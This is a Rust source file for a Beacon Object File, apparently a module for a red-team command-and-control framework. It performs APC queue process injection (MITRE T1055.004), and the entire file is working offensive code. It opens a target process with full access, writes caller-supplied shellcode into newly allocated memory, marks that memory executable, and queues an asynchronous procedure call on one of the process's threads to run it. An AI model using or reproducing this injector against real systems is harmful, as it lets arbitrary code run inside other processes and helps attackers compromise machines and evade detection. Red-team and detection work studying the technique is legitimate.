//! # NtQueueApcThread Injection BOF
//!
//! Injects shellcode into a remote process using APC queue injection.
//! Allocates memory in the target, writes shellcode, then queues an APC
//! to an alertable thread to trigger execution.
//!
//! ## MITRE ATT&CK
//! - T1055.004 - Process Injection: Asynchronous Procedure Call
//!
//! ## Arguments
//! - `int`: Target process ID.
//! - `bin`: Shellcode to inject.
//!

#![no_std]

use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::OpenProcess;

const PROCESS_ALL_ACCESS: u32 = 0x1FFFFF;

unsafe extern "system" {
    fn NtQueueApcThread(
        thread: *mut core::ffi::c_void,
        apc_routine: *mut core::ffi::c_void,
        apc_argument1: *mut core::ffi::c_void,
        apc_argument2: *mut core::ffi::c_void,
        apc_argument3: *mut core::ffi::c_void,
    ) -> i32;
}

fn find_thread(pid: u32) -> Option<u32> {
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snap == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut te: THREADENTRY32 = core::mem::zeroed();
        te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;

        if Thread32First(snap, &mut te) != 0 {
            loop {
                if te.th32OwnerProcessID == pid {
                    CloseHandle(snap);
                    return Some(te.th32ThreadID);
                }
                if Thread32Next(snap, &mut te) == 0 {
                    break;
                }
            }
        }

        CloseHandle(snap);
        None
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let pid = parser.get_int() as u32;
    let shellcode = parser.get_bytes();

    println!("NtQueueApcThread injection into PID: {}", pid);
    println!("Shellcode size: {} bytes", shellcode.len());

    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            eprintln!("OpenProcess failed: {}", GetLastError());
            return;
        }

        let remote_addr = VirtualAllocEx(
            process,
            core::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if remote_addr.is_null() {
            eprintln!("VirtualAllocEx failed: {}", GetLastError());
            CloseHandle(process);
            return;
        }

        let mut written: usize = 0;
        if WriteProcessMemory(
            process,
            remote_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut written,
        ) == 0
        {
            eprintln!("WriteProcessMemory failed: {}", GetLastError());
            CloseHandle(process);
            return;
        }

        let mut old_protect: u32 = 0;
        VirtualProtectEx(
            process,
            remote_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        let tid = match find_thread(pid) {
            Some(t) => t,
            None => {
                eprintln!("No thread found in PID {}", pid);
                CloseHandle(process);
                return;
            }
        };

        let thread = windows_sys::Win32::System::Threading::OpenThread(0x1FFFFF, 0, tid);
        if thread.is_null() {
            eprintln!("OpenThread failed: {}", GetLastError());
            CloseHandle(process);
            return;
        }

        let status = NtQueueApcThread(
            thread,
            remote_addr,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );

        if status == 0 {
            println!("SUCCESS: APC queued to thread {} in PID {}", tid, pid);
        } else {
            eprintln!("NtQueueApcThread failed: NTSTATUS 0x{:08X}", status);
        }

        CloseHandle(thread);
        CloseHandle(process);
    }
}
